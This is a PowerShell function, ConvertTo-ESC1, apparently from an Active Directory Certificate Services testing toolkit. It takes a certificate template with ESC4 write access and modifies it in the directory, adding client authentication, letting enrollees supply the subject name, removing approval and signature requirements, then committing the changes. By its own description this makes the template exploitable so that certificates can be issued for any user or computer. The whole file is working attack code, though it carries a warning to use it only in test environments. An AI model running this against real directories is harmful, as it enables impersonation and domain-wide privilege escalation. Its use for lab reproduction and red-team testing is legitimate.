function ConvertTo-ESC1 {
    <#
        .SYNOPSIS
        Converts an ESC4 vulnerability to an ESC1 vulnerability by modifying certificate template attributes.

        .DESCRIPTION
        This function takes an ESC4 ESCalatorIssue object and attempts to convert it to an ESC1 vulnerability
        by making the following changes to the associated certificate template:
        1. Add the "Client Authentication" EKU (1.3.6.1.5.5.7.3.2) to pKIExtendedKeyUsage
        2. Enable the SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1) in msPKI-Certificate-Name-Flag
        3. Remove the Pend flag (CT_FLAG_PEND_ALL_REQUESTS = 0x2) from msPKI-Enrollment-Flag
        4. Set the msPKI-RA-Signature value to 0 (disable required signatures)

        These changes make the template vulnerable to ESC1 attacks where attackers can specify
        arbitrary Subject Alternative Names and obtain certificates for any user/computer.

        .PARAMETER ESC4Issue
        An ESCalatorIssue object representing an ESC4 vulnerability. The object must have a DirectoryEntry
        property pointing to a certificate template object.

        .PARAMETER WhatIf
        Shows what changes would be made without actually performing them.

        .INPUTS
        ESCalatorIssue
        ESC4 ESCalatorIssue objects with certificate template DirectoryEntry objects.

        .OUTPUTS
        PSCustomObject
        Returns a result object indicating success/failure and what changes were made.

        .EXAMPLE
        $ESC4Issues = Find-ESC4Issue -AdcsObjects $AdcsObjects
        $ESC4Issues | Where-Object { $_.Subtype -like '*Template*' } | ConvertTo-ESC1

        .EXAMPLE
        $ESC4Issue = Find-ESC4Issue -AdcsObjects $AdcsObjects | Select-Object -First 1
        ConvertTo-ESC1 -ESC4Issue $ESC4Issue -WhatIf

        .LINK
        https://posts.specterops.io/certified-pre-owned-d95910965cd2

        .NOTES
        WARNING: This function makes destructive changes to certificate templates that create
        serious security vulnerabilities. Only use in controlled test environments.
        
        Requires appropriate permissions to modify certificate template objects in Active Directory.
    #>
    [CmdletBinding(SupportsShouldProcess)]
    param (
        [Parameter(Mandatory, ValueFromPipeline)]
        [ValidateNotNull()]
        $ESC4Issue
    )

    #requires -Version 5

    begin {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Starting $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
        
        # Define constants for certificate template flags
        $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT = 0x1
        $CT_FLAG_PEND_ALL_REQUESTS = 0x2
        
        # Client Authentication EKU OID
        $CLIENT_AUTH_EKU = "1.3.6.1.5.5.7.3.2"
    }

    process {
        Write-Verbose "Processing ESC4 issue for template: $($ESC4Issue.Name)"
        
        # Validate that this is an ESC4 issue
        if ($ESC4Issue.Technique -ne 'ESC4') {
            Write-Warning "Issue is not an ESC4 vulnerability (Technique: $($ESC4Issue.Technique))"
            return [PSCustomObject]@{
                Success = $false
                Template = $ESC4Issue.Name
                Error = "Not an ESC4 issue"
                Changes = @()
            }
        }
        
        # Validate that we have a DirectoryEntry for the template
        if (-not $ESC4Issue.DirectoryEntry -or $ESC4Issue.DirectoryEntry.SchemaClassName -ne 'pKICertificateTemplate') {
            Write-Warning "ESC4 issue does not contain a valid certificate template DirectoryEntry"
            return [PSCustomObject]@{
                Success = $false
                Template = $ESC4Issue.Name
                Error = "No valid certificate template DirectoryEntry found"
                Changes = @()
            }
        }
        
        $template = $ESC4Issue.DirectoryEntry
        $changes = @()
        $errors = @()
        
        try {
            # Refresh the DirectoryEntry to get current values
            $template.RefreshCache()
            
            Write-Verbose "Current template attributes:"
            Write-Verbose "  pKIExtendedKeyUsage: $($template.Properties['pKIExtendedKeyUsage'].Value -join ', ')"
            Write-Verbose "  msPKI-Certificate-Name-Flag: $($template.Properties['msPKI-Certificate-Name-Flag'].Value)"
            Write-Verbose "  msPKI-Enrollment-Flag: $($template.Properties['msPKI-Enrollment-Flag'].Value)"
            Write-Verbose "  msPKI-RA-Signature: $($template.Properties['msPKI-RA-Signature'].Value)"
            
            # 1. Add Client Authentication EKU to pKIExtendedKeyUsage
            $currentEKUs = @($template.Properties['pKIExtendedKeyUsage'].Value)
            if ($CLIENT_AUTH_EKU -notin $currentEKUs) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Add Client Authentication EKU to pKIExtendedKeyUsage")) {
                    $newEKUs = $currentEKUs + $CLIENT_AUTH_EKU
                    $template.Properties['pKIExtendedKeyUsage'].Clear()
                    foreach ($eku in $newEKUs) {
                        $template.Properties['pKIExtendedKeyUsage'].Add($eku)
                    }
                    $changes += "Added Client Authentication EKU ($CLIENT_AUTH_EKU)"
                    Write-Verbose "Added Client Authentication EKU to template"
                }
            } else {
                Write-Verbose "Client Authentication EKU already present"
            }
            
            # 2. Enable SAN flag in msPKI-Certificate-Name-Flag
            $currentNameFlag = [int]$template.Properties['msPKI-Certificate-Name-Flag'].Value
            $newNameFlag = $currentNameFlag -bor $CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT
            
            if ($newNameFlag -ne $currentNameFlag) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Enable SAN flag (CT_FLAG_ENROLLEE_SUPPLIES_SUBJECT) in msPKI-Certificate-Name-Flag")) {
                    $template.Properties['msPKI-Certificate-Name-Flag'].Value = $newNameFlag
                    $changes += "Enabled SAN flag in msPKI-Certificate-Name-Flag (0x$($currentNameFlag.ToString('X')) -> 0x$($newNameFlag.ToString('X')))"
                    Write-Verbose "Enabled SAN flag in msPKI-Certificate-Name-Flag"
                }
            } else {
                Write-Verbose "SAN flag already enabled in msPKI-Certificate-Name-Flag"
            }
            
            # 3. Remove Pend flag from msPKI-Enrollment-Flag
            $currentEnrollFlag = [int]$template.Properties['msPKI-Enrollment-Flag'].Value
            $newEnrollFlag = $currentEnrollFlag -band (-bnot $CT_FLAG_PEND_ALL_REQUESTS)
            
            if ($newEnrollFlag -ne $currentEnrollFlag) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Remove Pend flag (CT_FLAG_PEND_ALL_REQUESTS) from msPKI-Enrollment-Flag")) {
                    $template.Properties['msPKI-Enrollment-Flag'].Value = $newEnrollFlag
                    $changes += "Removed Pend flag from msPKI-Enrollment-Flag (0x$($currentEnrollFlag.ToString('X')) -> 0x$($newEnrollFlag.ToString('X')))"
                    Write-Verbose "Removed Pend flag from msPKI-Enrollment-Flag"
                }
            } else {
                Write-Verbose "Pend flag not set in msPKI-Enrollment-Flag"
            }
            
            # 4. Set msPKI-RA-Signature to 0
            $currentRASignature = [int]$template.Properties['msPKI-RA-Signature'].Value
            if ($currentRASignature -ne 0) {
                if ($PSCmdlet.ShouldProcess($template.Name, "Set msPKI-RA-Signature to 0 (disable required signatures)")) {
                    $template.Properties['msPKI-RA-Signature'].Value = 0
                    $changes += "Set msPKI-RA-Signature to 0 (was $currentRASignature)"
                    Write-Verbose "Set msPKI-RA-Signature to 0"
                }
            } else {
                Write-Verbose "msPKI-RA-Signature already set to 0"
            }
            
            # Commit changes to Active Directory
            if ($changes.Count -gt 0 -and -not $WhatIfPreference) {
                Write-Verbose "Committing $($changes.Count) changes to Active Directory..."
                $template.CommitChanges()
                Write-Verbose "Successfully committed changes to template: $($template.Name)"
            }
            
            # Return result
            return [PSCustomObject]@{
                Success = $true
                Template = $template.Name
                DistinguishedName = $template.Properties['distinguishedName'].Value
                Changes = $changes
                Error = $null
            }
            
        } catch {
            $errorMsg = "Failed to modify template $($template.Name): $($_.Exception.Message)"
            Write-Warning $errorMsg
            
            return [PSCustomObject]@{
                Success = $false
                Template = $template.Name
                Error = $errorMsg
                Changes = $changes
            }
        }
    }

    end {
        Write-Verbose "[$(Get-Date -Format 'yyyy-MM-dd hh:mm:ss')] Finishing $($MyInvocation.MyCommand) on $env:COMPUTERNAME..."
    }
}
